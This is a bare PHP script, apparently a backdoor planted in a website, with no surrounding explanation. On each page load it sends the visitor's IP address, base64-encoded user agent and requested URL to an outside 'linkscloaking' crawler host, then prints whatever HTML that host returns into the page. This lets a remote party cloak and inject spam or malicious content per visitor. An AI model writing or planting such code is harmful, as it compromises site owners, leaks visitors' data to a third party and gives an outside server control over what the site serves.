<?php
function file_get_contents_curl($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$rr=base64_encode($_SERVER['HTTP_USER_AGENT']);
$ipp=$_SERVER['REMOTE_ADDR'];
$actual_link = "http://".$_SERVER['HTTP_HOST']."".$_SERVER["REQUEST_URI"];
$html = file_get_contents_curl("http://crawler.linkscloaking.com/linknew.php?dlink=$actual_link&rbt=$rr&ip=$ipp");
echo $html;
?>
